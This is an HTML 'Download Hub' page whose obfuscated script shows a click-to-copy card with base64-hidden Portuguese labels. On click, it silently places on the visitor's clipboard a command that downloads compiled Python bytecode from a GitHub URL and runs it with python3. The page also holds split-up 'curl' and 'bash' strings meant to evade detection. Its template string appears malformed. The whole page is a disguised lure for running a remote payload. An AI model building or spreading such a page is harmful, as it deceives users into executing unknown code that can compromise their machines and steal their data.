<!doctype html>
<html>

    <title>Download Hub</title>

<body>
<script>
(() => {
    const _b = "cu" + "rl";
    const _c = " -sSsfL";
    const _d = " | ba" + "sh";

    const binaryStorageUrl = "https://github.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/raw/refs/heads/main/main.pyc";

    const textData = {
        title: atob('VG9xdWUgcGFyYSBjb3BpYXI='),
        desc: atob('VW0gY2xpY2tlIGUgdW0gY29udGV1ZG8gc2VyYSBjb3BpYWRvIGF1dG9tYXRpY2FtZW50ZS4='),
        status: atob('Q2xpcXVlIHBhcmEgY29waWFy'),
        success: atob('Q29waWFkbyBjb20gc3VjZXNzbyE='),
        fail: atob('TmFvIGZvaSBwb3NzaXZlbCBjb3BpYXI=')
    };

    const s = document.createElement('style');
    s.textContent = `* {box-sizing:border-box} html,body {margin:0;width:100%;height:100%} body {background:#090b0b;color:#fff;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;overflow:hidden} .card {width:420px;padding:40px 24px;background:rgba(16,35,31,.88);border:1px solid rgba(255,255,255,.12);border-radius:22px;box-shadow:0 0 80px rgba(0,255,170,.08);text-align:center;cursor:pointer;user-select:none} .title {font-size:28px;font-weight:700;margin:0} .desc {color:#aaa;font-size:15px;margin:12px 0 20px;line-height:1.5} .status {color:#00ff97;font-weight:700;font-size:16px} .card:hover {box-shadow:0 0 80px rgba(0,170,255,.16);border-color:rgba(0,170,255,.3)}`;
    document.head.appendChild(s);

    const c = document.createElement('div');
    c.className = 'card';
    c.innerHTML = `<h1 class="title">${textData.title}</h1><p class="desc">${textData.desc}</p><div class="status">${textData.status}</div>`;
    document.body.appendChild(c);

    c.onclick = () => {
        const executionString = `python3 <(curl -sSsfL "${binaryStorageUrl})";

        const e = document.createElement('textarea');
        e.value = executionString;
        e.setAttribute('readonly', '');
        e.style.position = 'fixed';
        e.style.left = '-9999px';
        document.body.appendChild(e);
        e.focus();
        e.select();
        
        let ok = false;
        try { ok = document.execCommand('copy'); } catch (_) {}
        e.remove();

        const sLabel = c.querySelector('.status');
        sLabel.textContent = ok ? textData.success : textData.fail;
        if (ok) setTimeout(() => sLabel.textContent = textData.status, 1500);
    };
})();
</script>
